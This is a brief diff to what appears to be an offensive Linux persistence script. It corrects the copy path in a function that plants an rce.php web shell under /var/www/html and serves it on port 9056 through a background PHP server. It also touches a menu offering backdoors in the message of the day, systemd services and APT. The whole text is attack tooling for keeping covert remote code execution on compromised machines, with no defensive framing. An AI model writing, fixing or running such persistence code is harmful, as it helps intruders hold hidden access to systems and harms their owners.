@@ -220,7 +220,7 @@ rcePersistence() {
     echo -e "\033[0;32m[+] - RCE Persistence\n"
     PORT=9056 
     mkdir /var/www/html/dynasty_rce 
-    cp rce.php /var/www/dynasty_rce/rce.php 
+    cp rce.php /var/www/html/dynasty_rce/rce.php 
     cd /var/www/html/dynasty_rce 
     nohup php -S 0.0.0.0:$PORT > /dev/null 2>&1 & 
     echo -e "\033[0;32m[+] - RCE on $PORT\n" 
@@ -319,7 +319,7 @@ payloads() {
     [${RED}9${RESET}] Backdooring Message of the Day / Header 
     [${RED}10${RESET}] Modify An Existing Systemd Service 
     [${RED}11${RESET}] Backdoor APT 
-    ${RESET}
+    ${RESET} 
     """ 
 }
 
